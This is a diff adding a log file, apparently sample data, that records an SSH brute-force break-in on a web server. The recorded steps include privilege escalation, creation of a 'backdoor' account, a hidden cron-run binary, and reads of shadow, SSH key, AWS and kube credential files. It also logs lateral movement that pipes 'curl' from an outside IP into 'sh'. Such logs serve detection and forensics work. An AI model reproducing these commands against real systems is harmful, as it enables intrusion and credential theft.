@@ -1,0 +1,97 @@
+Feb 11 02:14:03 web-prod-03 sshd[5411]: Failed password for ubuntu from 45.155.205.18 port 48014 ssh2
+Feb 11 02:14:04 web-prod-03 sshd[2455]: Failed password for root from 45.155.205.18 port 33983 ssh2
+Feb 11 02:14:07 web-prod-03 sshd[9277]: Failed password for test from 185.220.101.7 port 63990 ssh2
+Feb 11 02:14:10 web-prod-03 sshd[1345]: Invalid user admin from 45.155.205.18 port 39909
+Feb 11 02:14:11 web-prod-03 sshd[9892]: Failed password for admin from 45.155.205.18 port 35323 ssh2
+Feb 11 02:14:13 web-prod-03 sshd[9585]: Failed password for ubuntu from 185.220.101.7 port 30749 ssh2
+Feb 11 02:14:16 web-prod-03 sshd[7850]: Failed password for oracle from 45.155.205.18 port 34382 ssh2
+Feb 11 02:14:18 web-prod-03 sshd[5922]: Failed password for git from 45.155.205.18 port 35123 ssh2
+Feb 11 02:14:19 web-prod-03 sshd[2167]: Failed password for git from 185.220.101.7 port 38805 ssh2
+Feb 11 02:14:21 web-prod-03 sshd[7480]: Failed password for oracle from 45.155.205.18 port 33511 ssh2
+Feb 11 02:14:22 web-prod-03 sshd[4793]: Invalid user oracle from 45.155.205.18 port 47556
+Feb 11 02:14:23 web-prod-03 sshd[1470]: Invalid user ubuntu from 185.220.101.7 port 34528
+Feb 11 02:14:26 web-prod-03 sshd[2392]: Failed password for oracle from 45.155.205.18 port 40368 ssh2
+Feb 11 02:14:28 web-prod-03 sshd[5587]: Failed password for postgres from 45.155.205.18 port 41080 ssh2
+Feb 11 02:14:30 web-prod-03 sshd[2846]: Failed password for ubuntu from 185.220.101.7 port 41994 ssh2
+Feb 11 02:14:32 web-prod-03 sshd[2239]: Failed password for postgres from 45.155.205.18 port 37370 ssh2
+Feb 11 02:14:34 web-prod-03 sshd[8877]: Failed password for deploy from 45.155.205.18 port 43470 ssh2
+Feb 11 02:14:35 web-prod-03 sshd[1445]: Failed password for www-data from 185.220.101.7 port 43178 ssh2
+Feb 11 02:14:37 web-prod-03 sshd[2330]: Failed password for deploy from 45.155.205.18 port 61384 ssh2
+Feb 11 02:14:40 web-prod-03 sshd[8898]: Failed password for admin from 45.155.205.18 port 33209 ssh2
+Feb 11 02:14:43 web-prod-03 sshd[2796]: Failed password for www-data from 185.220.101.7 port 31885 ssh2
+Feb 11 02:14:44 web-prod-03 sshd[7336]: Invalid user root from 45.155.205.18 port 57847
+Feb 11 02:14:46 web-prod-03 sshd[2140]: Failed password for root from 45.155.205.18 port 58561 ssh2
+Feb 11 02:14:49 web-prod-03 sshd[3015]: Invalid user root from 185.220.101.7 port 30857
+Feb 11 02:14:50 web-prod-03 sshd[8748]: Failed password for admin from 45.155.205.18 port 40831 ssh2
+Feb 11 02:14:51 web-prod-03 sshd[1091]: Failed password for test from 45.155.205.18 port 34065 ssh2
+Feb 11 02:14:54 web-prod-03 sshd[6167]: Invalid user oracle from 185.220.101.7 port 53872
+Feb 11 02:14:56 web-prod-03 sshd[6975]: Failed password for ubuntu from 45.155.205.18 port 44130 ssh2
+Feb 11 02:14:59 web-prod-03 sshd[7264]: Failed password for admin from 45.155.205.18 port 50834 ssh2
+Feb 11 02:15:02 web-prod-03 sshd[4032]: Failed password for www-data from 185.220.101.7 port 54009 ssh2
+Feb 11 02:15:06 web-prod-03 sshd[3337]: Invalid user test from 45.155.205.18 port 42576
+Feb 11 02:15:10 web-prod-03 sshd[6704]: Invalid user deploy from 45.155.205.18 port 63823
+Feb 11 02:15:12 web-prod-03 sshd[9749]: Invalid user postgres from 185.220.101.7 port 58146
+Feb 11 02:15:14 web-prod-03 sshd[9684]: Failed password for ubuntu from 45.155.205.18 port 64518 ssh2
+Feb 11 02:15:18 web-prod-03 sshd[1620]: Invalid user git from 45.155.205.18 port 30502
+Feb 11 02:15:19 web-prod-03 sshd[5898]: Failed password for test from 185.220.101.7 port 57492 ssh2
+Feb 11 02:15:21 web-prod-03 sshd[9097]: Invalid user admin from 45.155.205.18 port 35955
+Feb 11 02:15:23 web-prod-03 sshd[9983]: Invalid user www-data from 45.155.205.18 port 62121
+Feb 11 02:15:24 web-prod-03 sshd[9122]: Failed password for git from 185.220.101.7 port 31211 ssh2
+Feb 11 02:15:25 web-prod-03 sshd[7937]: Failed password for git from 45.155.205.18 port 54178 ssh2
+Feb 11 02:15:28 web-prod-03 sshd[9721]: Failed password for www-data from 45.155.205.18 port 47132 ssh2
+Feb 11 02:15:31 web-prod-03 sshd[4677]: Failed password for www-data from 45.155.205.18 port 42108 ssh2
+Feb 11 02:15:33 web-prod-03 sshd[6742]: Failed password for test from 45.155.205.18 port 35017 ssh2
+Feb 11 02:15:35 web-prod-03 sshd[2525]: Invalid user test from 45.155.205.18 port 61044
+Feb 11 02:15:38 web-prod-03 sshd[1107]: Invalid user admin from 45.155.205.18 port 52727
+Feb 11 02:15:39 web-prod-03 sshd[5639]: Invalid user postgres from 45.155.205.18 port 62951
+Feb 11 02:15:41 web-prod-03 sshd[8420]: Failed password for admin from 45.155.205.18 port 40389 ssh2
+Feb 11 02:15:43 web-prod-03 sshd[6185]: Failed password for postgres from 45.155.205.18 port 30679 ssh2
+Feb 11 02:15:46 web-prod-03 sshd[2379]: Failed password for test from 45.155.205.18 port 42251 ssh2
+Feb 11 02:15:50 web-prod-03 sshd[6716]: Invalid user www-data from 45.155.205.18 port 30288
+Feb 11 02:15:51 web-prod-03 sshd[1864]: Invalid user postgres from 45.155.205.18 port 52559
+Feb 11 02:15:53 web-prod-03 sshd[5966]: Failed password for postgres from 45.155.205.18 port 57614 ssh2
+Feb 11 02:15:56 web-prod-03 sshd[6887]: Failed password for oracle from 45.155.205.18 port 50827 ssh2
+Feb 11 02:16:00 web-prod-03 sshd[9561]: Invalid user deploy from 45.155.205.18 port 57821
+Feb 11 02:16:03 web-prod-03 sshd[6459]: Failed password for ubuntu from 45.155.205.18 port 61478 ssh2
+Feb 11 02:16:05 web-prod-03 sshd[2724]: Failed password for ubuntu from 45.155.205.18 port 44039 ssh2
+Feb 11 02:16:08 web-prod-03 sshd[6270]: Invalid user oracle from 45.155.205.18 port 31889
+Feb 11 02:16:11 web-prod-03 sshd[3378]: Failed password for oracle from 45.155.205.18 port 54078 ssh2
+Feb 11 02:17:41 web-prod-03 sshd[8705]: Accepted publickey for deploy from 193.106.191.19 port 51234 ssh2: RSA SHA256:7xKq9wRt2YbN4cE1mZ8vL3pA6sD0fG5hJ
+Feb 11 02:17:48 web-prod-03 bash[7456]: cmd: id
+Feb 11 02:17:53 web-prod-03 bash[9750]: cmd: uname -a
+Feb 11 02:17:58 web-prod-03 bash[2013]: cmd: cat /etc/passwd | tail -5
+Feb 11 02:18:04 web-prod-03 bash[2677]: cmd: hostname -I
+Feb 11 02:18:18 web-prod-03 bash[9890]: cmd: whoami
+Feb 11 02:18:31 web-prod-03 bash[1559]: cmd: ls -la /home
+Feb 11 02:18:39 web-prod-03 bash[1250]: cmd: crontab -l
+Feb 11 02:18:48 web-prod-03 bash[6169]: cmd: cat /etc/crontab
+Feb 11 02:18:57 web-prod-03 bash[1259]: cmd: env | grep -i proxy
+Feb 11 02:19:11 web-prod-03 bash[7450]: cmd: find / -maxdepth 3 -name '*.pem' 2>/dev/null
+Feb 11 02:19:19 web-prod-03 bash[8236]: cmd: dpkg -l | grep -i nginx
+Feb 11 02:20:14 web-prod-03 sudo[8766]: www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Feb 11 02:21:20 web-prod-03 sudo[7632]: www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Feb 11 02:21:39 web-prod-03 su[7608]: Successful su for root by deploy
+type=USER_ACCT msg=audit(1770772910.801:4100): pid=2214 uid=0 auid=1001 ses=3 msg='op=PAM:user_acct_chauthtok acct="deploy" exe="/usr/sbin/chpasswd" hostname=? addr=10.20.4.19 terminal=pts/0 res=success'
+type=USER_ACCT msg=audit(1770772933.604:4101): pid=2215 uid=0 auid=1001 ses=3 msg='op=PAM:user_acct_create acct="backdoor" exe="/usr/sbin/useradd" addr=10.20.4.19 terminal=pts/0 res=success'
+type=GROUP_ACCT msg=audit(1770772940.366:4102): pid=2216 uid=0 auid=1001 ses=3 msg='op=PAM:group_modify acct="backdoor" exe="/usr/sbin/gpasswd" addr=10.20.4.19 terminal=pts/0 res=success'
+Feb 11 02:23:32 web-prod-03 sshd[2276]: Accepted password for backdoor from 193.106.191.19 port 52001 ssh2
+Feb 11 02:26:10 web-prod-03 cron[1269]: (root) CMD (/usr/bin/python3 /tmp/.x/kdevtmpfsi)
+Feb 11 02:26:32 web-prod-03 systemd[6084]: Created slice system.slice/cleanup.service.
+Feb 11 02:27:10 web-prod-03 sshd[9426]: Accepted publickey for backdoor from 193.106.191.19 port 52044 ssh2: ED25519 SHA256:9dQ2xLm5pR7tV1wY8zB3nK6sF0gH4jC2
+Feb 11 02:27:14 web-prod-03 bash[8475]: cmd: cat /etc/shadow
+Feb 11 02:27:23 web-prod-03 bash[4032]: cmd: cat /root/.ssh/id_rsa
+Feb 11 02:27:26 web-prod-03 bash[2072]: cmd: cat /var/lib/jenkins/.ssh/id_ed25519
+Feb 11 02:27:28 web-prod-03 bash[9876]: cmd: cat /etc/mysql/debian.cnf
+Feb 11 02:27:35 web-prod-03 bash[8192]: cmd: cat /root/.aws/credentials
+Feb 11 02:27:43 web-prod-03 bash[9019]: cmd: cat /home/deploy/.kube/config
+type=SYSCALL msg=audit(1770773270.752:4103): pid=2288 uid=0 auid=1001 ses=3 msg='arch=c000003e syscall=59 success=yes exit=0 a0=7ffd2c0b29c8 exe="/usr/bin/cat" key="exec"
+Feb 11 02:30:56 web-prod-03 bash[9916]: cmd: ssh -o StrictHostKeyChecking=no root@10.20.4.31 'curl -s http://193.106.191.19/i|sh'
+Feb 11 02:30:59 web-prod-03 bash[6854]: cmd: ssh -o StrictHostKeyChecking=no root@10.20.4.12 'curl -s http://193.106.191.19/i|sh'
+Feb 11 02:31:04 web-prod-03 bash[3397]: cmd: ssh -o StrictHostKeyChecking=no root@10.20.4.88 'curl -s http://193.106.191.19/i|sh'
+Feb 11 02:31:08 web-prod-03 bash[6923]: cmd: ssh -o StrictHostKeyChecking=no root@10.20.4.5 'curl -s http://193.106.191.19/i|sh'
+Feb 11 02:31:14 web-prod-03 bash[3848]: cmd: ssh -o StrictHostKeyChecking=no root@10.20.4.61 'curl -s http://193.106.191.19/i|sh'
+Feb 11 02:31:18 web-prod-03 bash[9713]: cmd: ssh -o StrictHostKeyChecking=no root@10.20.4.40 'curl -s http://193.106.191.19/i|sh'
+Feb 11 02:31:28 web-prod-03 sshd[6741]: Accepted publickey for root from 10.20.4.19 port 46217 ssh2
+Feb 11 02:31:42 web-prod-03 sshd[2967]: Accepted publickey for root from 10.20.4.19 port 42926 ssh2
+Feb 11 02:32:21 web-prod-03 kernel[9361]: [UFW BLOCK] IN=eth0 OUT= SRC=193.106.191.19 DST=10.20.4.19 PROTO=TCP SPT=51234 DPT=4444
+Feb 11 02:33:01 web-prod-03 kernel[5485]: [UFW BLOCK] IN=eth0 OUT= SRC=193.106.191.19 DST=10.20.4.19 PROTO=TCP SPT=51240 DPT=9001
